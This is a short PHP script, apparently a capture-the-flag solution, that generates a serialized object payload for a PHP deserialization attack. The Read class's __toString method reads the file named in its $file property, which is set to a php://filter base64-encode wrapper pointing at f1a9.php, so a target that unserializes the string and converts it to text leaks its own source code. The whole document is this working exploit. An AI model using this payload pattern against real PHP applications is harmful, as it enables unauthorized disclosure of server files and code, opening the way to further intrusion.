<?php

class Read{//f1a9.php
    public $file="php://filter/read=convert.base64-encode/resource=f1a9.php";
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
        }
        return "__toString was called!";

    }
}

$object  = new Read();
echo serialize($object);
?>